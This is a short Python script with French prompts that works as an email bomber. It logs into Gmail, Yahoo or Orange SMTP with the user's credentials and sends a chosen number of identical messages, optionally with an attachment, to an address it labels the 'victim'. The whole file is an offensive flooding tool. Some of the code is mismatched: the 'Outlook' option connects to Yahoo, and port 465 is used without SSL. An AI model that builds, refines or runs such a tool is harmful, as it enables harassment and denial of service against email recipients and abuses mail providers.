import smtplib
import getpass
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate
import logging

server = input ("Entrez le serveur SMTP que vous souhaitez utiliser ou choisissez l'un de ceux proposés (1:Gmail, 2:Outlook, 3:Orange) \n ")
SrcEmail = input(str('Entrez votre email: '))
SrcMdp = getpass.getpass('Entrez votre mot de passe: ')
 
 
DestEmail = input('\nEmail de la victime: ')
Sujet = input('Sujet: ') 
Contenu = input('Message: ')
Joint = input('Souhaitez vous ajouter une piece jointe ? Si oui, veuillez entrer le chemin pour y accéder')
Nbr_Mails = int(input('Combien de mails voulez vous envoyer ? '))

msg = MIMEMultipart()
msg['Date'] = formatdate(localtime=True)
msg['Subject'] = Sujet
msg['From'] = SrcEmail
msg['To'] = DestEmail

msg.attach(MIMEText(open(Joint).read()))

if server == '1':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == '2':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
elif server == '3':
    smtp_server = 'smtp.orange.fr'
    port = 465
else:
    print ('Appliqué à tous les serveurs')
    sys.exit()
 
print ('')
 
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(SrcEmail,SrcMdp)
    
    for i in range(0,Nbr_Mails):
        server.sendmail(SrcEmail,DestEmail,msg.as_string())
        i +=1
    print ("\r[+] Nombre d'emails envoyés: %i" % i)
    sys.stdout.flush()
    server.quit()
    print ('\n [+] Envoie terminé')
    
    logging.basicConfig(filename='log.log', encoding='utf-8', level=logging.DEBUG)
    logging.info(msg)
    
except KeyboardInterrupt:
    print ('[-] Annulé')
    sys.exit()
   
except smtplib.SMTPAuthenticationError:
    print ('\n[!] Email ou mot de passe incorrect')
    sys.exit()
